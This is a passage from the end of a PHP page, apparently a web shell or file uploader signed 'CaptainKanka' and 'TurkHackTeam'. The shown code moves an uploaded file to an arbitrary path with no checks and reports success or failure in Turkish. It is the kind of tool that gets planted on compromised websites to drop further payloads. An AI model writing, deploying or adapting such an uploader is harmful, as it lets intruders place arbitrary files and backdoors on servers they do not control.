            $sonuc = move_uploaded_file($gecici_yol, $yola);
            if ($sonuc) {
                echo "<center><font color='#fff'>oldu</font>";
            } else {
                echo "<center><font color='#fff'>olmadı</font>";
            }
        } else {
            $yola = $dosya_adi;
            $sonuc = move_uploaded_file($gecici_yol, $yola);
            if ($sonuc) {
                echo "<center><font color='#fff'>oldu</font>";
            } else {
                echo "<center><font color='#fff'>olmadı</font>";
            }
        }
    } ?>
				﻿

				<div style="text-align: center">

					<?php ob_end_flush(); ?>
					<center>
						<div class="btnnnnnn" style="width:15%;">
							<font size="2" color="#fff">'CaptainKanka<br></font>
							<font color="red" size="5">T</font>
							<font color="#fff" size="5">urk</font>
							<font color="red" size="5">H</font>
							<font color="#fff" size="5">ack</font>
							<font color="red" size="5">T</font>
							<font color="#fff" size="5">eam</font>
						</div>
					</center>
	</body>

</html>